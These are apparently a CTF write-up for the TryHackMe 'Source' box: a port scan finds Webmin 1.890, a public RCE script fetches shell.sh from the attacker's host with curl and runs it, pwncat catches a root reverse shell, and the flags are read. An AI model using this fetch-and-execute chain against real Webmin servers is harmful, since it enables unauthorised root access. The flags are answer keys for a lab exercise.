# Box Name

## Source

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
 ## nmap
 ```bash
  rustscan -a 10.10.47.224 --ulimit 5000 -- -sCV -oN nmap/source
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.47.224:22
Open 10.10.47.224:10000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbZAxRhWUij6g6MP11OkGSk7vYHRNyQcTIdMmjj1kSvDhyuXS9QbM5t2qe3UMblyLaObwKJDN++KWfzl1+beOrq3sXkTA4Wot1RyYo0hPdQT0GWBTs63dll2+c4yv3nDiYAwtSsPLCeynPEmSUGDjkVnP12gxXe/qCsM2+rZ9tzXtSWiXgWvaxMZiHaQpT1KaY0z6ebzBTI8siU0t+6SMK7rNv1CsUNpGeicfbC5ZOE4/Nbc8cxNl7gDtZbyjdh9S7KTvzkSj2zBJ+8VbzsuZk1yy8uyLDgmuBQ6LzbYUNHkTQhJetVq7utFpRqLdpSJTcsz5PAxd1Upe9DqoYURuL
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEYCha8jk+VzcJRRwV41rl8EuJBiy7Cf8xg6tX41bZv0huZdCcCTCq9dLJlzO2V9s+sMp92TpzR5j8NAAuJt0DA=
|   256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJnY5oycmgw6ND6Mw4y0YQWZiHoKhePo4bylKKCP0E5
10000/tcp open  http    syn-ack MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: F1FBBC52A707557BAE8A938E7B3D3AAC
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesnt have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

---
## Initial Foothold
---
 ## miniserv 1.890 python script [[revshell]]
 ###  {{https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py}}

```bash
 python3 exploit.py 10.10.47.224 10000 'curl http://10.13.13.55:9001/shell.sh -o /tmp/shell.sh'


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0

```

```bash
                                                                                                                    
┌──(kn1ght㉿Kali)-[~/THM/Source]
└─$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.10.47.224 - - [05/Jul/2022 18:03:58] "GET /shell.sh HTTP/1.1" 200 -

```

```bash
python3 exploit.py 10.10.47.224 10000 'bash /tmp/shell.sh'


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
</p>
```

```bash

pwncat-cs -lp 1234
[18:10:14] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
[18:10:18] received connection from 10.10.47.224:40972                                                                                                                                                                           bind.py:84
[18:10:21] 0.0.0.0:1234: normalizing shell path                                                                                                                                                                              manager.py:957
[18:10:23] 10.10.47.224:40972: registered new host w/ db                                                                                                                                                                     manager.py:957
(local) pwncat$                                                                                                                                                                                                                            
(remote) root@source:/usr/share/webmin/# id;whoami
uid=0(root) gid=0(root) groups=0(root)
root
(remote) root@source:/usr/share/webmin/# 

```


 ## cat flags
 
```bash
(remote) root@source:/usr/share/webmin/# cat /home/dark/user.txt
'THM{SUPPLY_CHAIN_COMPROMISE}'
(remote) root@source:/usr/share/webmin/# cat /root/root.txt
'THM{UPDATE_YOUR_INSTALL}'
(remote) root@source:/usr/share/webmin/# 
```
---



## Privilege Escalation
----
